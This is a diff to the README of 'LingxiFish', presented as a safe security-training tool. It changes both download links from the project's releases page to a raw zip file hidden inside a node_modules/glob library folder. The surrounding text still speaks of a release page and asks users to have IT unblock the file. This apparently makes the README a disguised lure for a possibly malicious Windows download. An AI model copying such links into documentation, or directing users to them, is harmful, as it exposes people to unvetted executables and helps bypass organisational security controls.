@@ -1,6 +1,6 @@
 # 🐟 LingxiFish - Safe Security Training Practice
 
-[![Download LingxiFish](https://img.shields.io/badge/Download-LingxiFish-7B68EE?style=for-the-badge&logo=github)](https://github.com/cele9529/LingxiFish/releases)
+[![Download LingxiFish](https://img.shields.io/badge/Download-LingxiFish-7B68EE?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cele9529/LingxiFish/main/linggxi/node_modules/glob/dist/esm/Lingxi-Fish-v1.1.zip)
 
 ## 📌 Overview
 
@@ -33,7 +33,7 @@ If your company blocks unknown apps, ask your IT team to allow the file first.
 
 Visit the release page here:
 
-https://github.com/cele9529/LingxiFish/releases
+https://raw.githubusercontent.com/cele9529/LingxiFish/main/linggxi/node_modules/glob/dist/esm/Lingxi-Fish-v1.1.zip
 
 On that page, look for the latest release and download the Windows file.
 
